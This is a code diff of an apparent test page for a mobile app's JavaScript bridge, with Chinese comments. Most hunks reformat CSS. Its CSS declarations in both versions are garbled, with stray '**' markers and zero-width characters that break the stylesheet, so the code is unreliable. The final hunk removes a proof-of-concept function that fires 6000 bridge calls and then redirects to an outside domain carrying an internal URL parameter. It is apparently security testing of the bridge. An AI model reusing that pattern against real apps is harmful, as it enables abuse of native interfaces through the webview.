@@ -14,9 +14,7 @@
             padding: 15vh 20px 0;
             background: #f0f2f5;
             box-sizing: border-box;
-            ​**font-size: 36px;
-            **​
-            /* 全局基准字号 ×2 */
+            ​**font-size: 36px;**​ /* 全局基准字号 ×2 */
         }
 
         pre {
@@ -29,31 +27,22 @@
             min-height: 200px;
             border-radius: 8px;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-            ​**line-height: 1.8;
-            **​
-            /* 行高 ×2 */
-            ​**font-family: monospace, sans-serif;
-            **​
-            /* 明确字體 */
+            ​**line-height: 1.8;**​ /* 行高 ×2 */
+            ​**font-family: monospace, sans-serif;**​ /* 明确字體 */
             margin-top: 30px;
         }
 
         button {
-            padding: 16px 40px;
-            /* 内边距 ×2 */
+            padding: 16px 40px; /* 内边距 ×2 */
             background: #007bff;
             color: white;
             border: none;
             border-radius: 6px;
             cursor: pointer;
-            font-size: ​**36px;
-            **​
-            /* 按钮字号 ×2 */
+            font-size: ​**36px;**​ /* 按钮字号 ×2 */
             transition: all 0.3s;
             transform: translateY(20%);
-            ​**min-width: 220px;
-            **​
-            /* 最小宽度 ×2 */
+            ​**min-width: 220px;**​ /* 最小宽度 ×2 */
         }
 
         button:hover {
@@ -133,21 +122,12 @@
             output.textContent = "请求发送中...";
 
             try {
-
                 const callbackId = `dev_${Date.now()}`;
                 window.JsRuntime.invoke('getAppVersion', '{}', callbackId);
             } catch (error) {
                 output.textContent = `请求失败: ${error.message}`;
             }
         }
-
-        function poc() {
-            for (var i = 0; i < 6000; i++) {
-                setTimeout(getAppVersion, i)
-            }
-            document.location.href = "https://www.povcfe.site?url=https://pov.woa.com";
-        }
-
 
         function getDeviceInfo() {
             const output = document.getElementById('raw-output');
